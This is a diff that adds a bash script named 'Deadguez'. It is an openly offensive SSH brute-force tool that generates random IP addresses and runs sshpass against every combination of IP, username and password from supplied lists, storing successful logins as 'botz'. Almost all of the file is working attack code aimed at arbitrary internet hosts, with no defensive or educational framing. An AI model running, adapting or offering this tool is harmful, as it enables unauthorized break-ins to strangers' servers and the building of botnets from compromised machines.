@@ -1,0 +1,139 @@
+#!/bin/bash
+
+# Codename: Deadguez
+# Author: Arya Narotama (4WSec)
+# Github: github.com/aryanrtm
+# Give me the credits if you recode this tool. Don't be a SKID!
+
+### Colors
+BK=$(tput setaf 0) # Black
+GR=$(tput setaf 2) # Green
+RD=$(tput setaf 1) # Red
+YW=$(tput setaf 3) # Yellow
+CY=$(tput setaf 6) # Cyan
+WH=$(tput setaf 7) # White
+PP=$(tput setaf 5) # purple
+NT=$(tput sgr0) # Netral
+BD=$(tput bold) # Bold
+BG=$(tput setab 4) # Background Color
+
+### Today's date
+date=$(date "+%d_%m_%Y")
+### Count (threads)
+CON=1
+
+function _Banner() {
+	printf "
+		${BD}${PP}╔╦╗ ╔═╗ ╔═╗ ╔╦╗ ╔═╗ ╦ ╦ ╔═╗ ╔═╗
+		 ${WH}║║ ║╣  ╠═╣  ║║ ║ ╦ ║ ║ ║╣  ╔═╝
+		${GR}═╩╝ ╚═╝ ╩ ╩ ═╩╝ ╚═╝ ╚═╝ ╚═╝ ╚═╝  ${WH}by ${CY}4${GR}W${PP}S${GR}e${PP}c
+		═══${RD}═══${CY}════${WH}════${GR}═════${YW}═════${RD}════${CY}═══\n
+	     ${PP}--=[ ${CY}Type ${GR}!help ${CY}for Commands List ${PP}]=--${NT}\n\n"
+}
+
+function _IP_Generator() {
+	for (( i = 0; i < $TOTAL; i++ )); do
+		printf "%d.%d.%d.%d\n" "$((RANDOM % 256))" "$((RANDOM % 256))" "$((RANDOM % 256))" "$((RANDOM % 256))" >> ${date}_ip.txt
+	done 2> /dev/null
+}
+
+function _Attack_SSH() {
+	# Function of login SSH
+	local GO_ATTACK=$(sshpass -p "${PASSLIST}" ssh -o StrictHostKeyChecking=no "${USERLIST}"@"${IPLIST}" -p ${PORT} uname -a 2> /dev/null | grep -c "0");
+
+	if [[ $GO_ATTACK == "1" ]]; then
+		printf " ${BD}${WH}[${GR}+${WH}] ${WH}[${GR}${IPLIST}:${USERLIST}:${PASSLIST}:${PORT}${WH}] - ${WH}[${GR}Botz Connected${WH}]${NT}\n"
+		echo "${IPLIST}:${USERLIST}:${PASSLIST}:${PORT}" >> botz.txt
+	elif [[ $GO_ATTACK == "0" ]]; then
+		printf " ${BD}${WH}[${RD}-${WH}] ${WH}[${RD}${IPLIST}:${USERLIST}:${PASSLIST}:${PORT}${WH}] - ${WH}[${RD}Connection Refused${WH}]${NT}\n"
+	else
+		printf " ${WH}[${YW}?${WH}] ${WH}[${YW}${IPLIST}:${USERLIST}:${PASSLIST}:${PORT}${WH}] - ${WH}[${YW}Connection Unknown${WH}]\n"
+	fi
+}
+
+function _Help() {
+	printf "\n ${BD}${CY}══════════════════════════════════════════════════${NT}\n"
+	printf " ${WH}!help                | For more information\n"
+	printf " !generate            | Generate IP randomly\n"
+	printf " !attack              | Start attacking SSH\n"
+	printf " !botz                | Display the total botz connected\n"
+	printf " !clear               | Clear terminal screen\n"
+	printf " !q                   | Exit\n"
+	printf " ${BD}${CY}══════════════════════════════════════════════════${NT}\n"
+}
+
+_Banner
+while true; do
+	echo -ne "\n${BD}${PP}$(whoami)${WH}@${PP}deadguez: ${GR}>> ${NT}${CY}"; read opt;
+
+	if [[ $opt == "!generate" ]]; then
+		echo -ne "\n ${WH}[${RD}?${WH}] ${CY}How many: ${WH}"; read TOTAL;
+		_IP_Generator
+		if [[ $? -eq 0 ]]; then
+			printf " ${BD}${WH}[${GR}+${WH}] ${GR}Successfully generate ${WH}$(echo "${TOTAL}") ${GR}IP Address${NT}\n"
+			printf " ${WH}[${GR}+${WH}] ${CY}File: ${WH}$(echo ${date}_ip.txt)\n"		
+		else
+			printf " ${BD}${WH}[${RD}-${WH}] ${RD}Unsuccessful generate IP Address${NT}\n"
+		fi
+	elif [[ $opt == "!attack" ]]; then
+		# IP List
+		echo -ne "\n ${WH}[${RD}?${WH}] ${CY}IP List: ${WH}"; read IP_LIST;
+		if [[ ! -e $IP_LIST ]]; then
+			printf " ${RD}[!] ${YW}File Not Found\n"
+			./${0}
+		fi
+
+		# Open Port
+		read -p " ${WH}[${RD}?${WH}] ${CY}Port (Default 22): ${WH}" PORT;
+		if [[ $PORT="" ]]; then
+			PORT=22
+		fi
+
+		# Username List
+		read -p " ${WH}[${RD}?${WH}] ${CY}Username List: ${WH}" USER_LIST;
+		if [[ ! -e $USER_LIST ]]; then
+			printf " ${RD}[!] ${YW}File Not Found\n"
+			./${0}
+		fi
+
+		# Password List
+		read -p " ${WH}[${RD}?${WH}] ${CY}Password List: ${WH}" PASS_LIST;
+		if [[ ! -e $PASS_LIST ]]; then
+			printf " ${RD}[!] ${YW}File Not Found\n"
+			./${0}
+		fi
+
+		# Total Threads
+		read -p " ${WH}[${RD}?${WH}] ${CY}Threads (Default 50): ${WH}" THREADS;
+		if [[ $THREADS="" ]]; then
+			THREADS=50
+		fi
+		printf "\n\t${WH}[ ${CY}Scanner Mode ${BD}${GR}ON ${NT}${WH}]\n\n"
+
+		for IPLIST in $(cat $IP_LIST); do
+			for USERLIST in $(cat $USER_LIST); do
+				for PASSLIST in $(cat $PASS_LIST); do
+					fast=$(expr $CON % $THREADS)
+					if [[ $fast == 0 && $CON > 0 ]]; then
+						sleep 3
+					fi
+					_Attack_SSH &
+					CON=$[$CON+1]
+				done
+			done
+		done
+		wait
+	elif [[ $opt == "!help" ]]; then
+		_Help
+	elif [[ $opt == "!q" ]]; then
+		exit 0
+	elif [[ $opt == "!botz" ]]; then
+		printf "\n ${BD}${WH}[${PP}*${WH}] ${GR}Total Botz: ${PP}$(cat botz.txt | wc -l)\n"
+	elif [[ $opt == "!clear" ]]; then
+		clear
+		./${0}
+	else
+		printf "\n ${WH}[${YW}?${WH}] ${RD}Unknown Command\n"
+		./${0}
+	fi
+done
